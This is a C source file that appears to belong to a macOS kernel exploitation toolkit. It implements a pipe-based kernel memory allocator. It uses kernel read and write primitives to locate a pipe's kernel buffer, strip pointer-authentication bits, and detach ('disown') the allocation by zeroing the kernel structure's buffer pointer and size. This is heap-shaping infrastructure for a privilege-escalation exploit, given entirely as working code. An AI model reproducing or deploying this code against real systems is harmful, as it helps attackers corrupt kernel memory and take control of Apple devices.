//
//  allocator_pipe.c
//  xe
//
//  Created by admin on 11/22/21.
//

#include <assert.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/errno.h>

#include "allocator/small_mem.h"
#include "xnu/proc.h"
#include "util/ptrauth.h"
#include "memory/kmem.h"
#include "util/assert.h"
#include "util/log.h"

#include "macos_params.h"


struct xe_allocator_small_mem {
    int fd0;
    int fd1;
};

xe_allocator_small_mem_t xe_allocator_small_mem_allocate(size_t size, uintptr_t* buffer_ptr_out) {
    xe_assert_cond(size, <=, 4 * 16384);
    
    int fds[2];
    int res = pipe(fds);
    xe_assert_errno(res);
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    
    uintptr_t pipe;
    int error = xe_xnu_proc_find_fd_data(proc, fds[0], &pipe);
    xe_assert_err(error);
    
    char* temp = malloc(size);
    bzero(temp, size);
    ssize_t bytes = write(fds[1], temp, size);
    xe_assert_cond(bytes, ==, size);
    free(temp);
    
    uintptr_t buffer = xe_ptrauth_strip(xe_kmem_read_uint64(pipe, TYPE_PIPEBUF_MEM_BUFFER_OFFSET));
    uint buffer_size = xe_kmem_read_uint32(pipe, TYPE_PIPEBUF_MEM_SIZE_OFFSET);
    xe_assert(buffer_size >= size);
    xe_log_debug("pipe allocator allocated entry size: %d", buffer_size);
    
    xe_allocator_small_mem_t allocator = (xe_allocator_small_mem_t)malloc(sizeof(struct xe_allocator_small_mem));
    allocator->fd0 = fds[0];
    allocator->fd1 = fds[1];
    *buffer_ptr_out = buffer;
    
    return allocator;
}

uintptr_t xe_allocator_small_allocate_disowned(size_t size) {
    uintptr_t addr;
    xe_allocator_small_mem_t allocator = xe_allocator_small_mem_allocate(size, &addr);
    
    uintptr_t pipe;
    int error = xe_xnu_proc_find_fd_data(xe_xnu_proc_current_proc(), allocator->fd0, &pipe);
    xe_assert_err(error);
    
    xe_kmem_write_uint64(pipe, TYPE_PIPEBUF_MEM_BUFFER_OFFSET, 0);
    xe_kmem_write_uint64(pipe, TYPE_PIPEBUF_MEM_SIZE_OFFSET, 0);
    
    xe_allocator_small_mem_destroy(&allocator);
    return addr;
}

void xe_allocator_small_mem_destroy(xe_allocator_small_mem_t* pipe) {
    close((*pipe)->fd0);
    close((*pipe)->fd1);
    free(*pipe);
    *pipe = NULL;
}
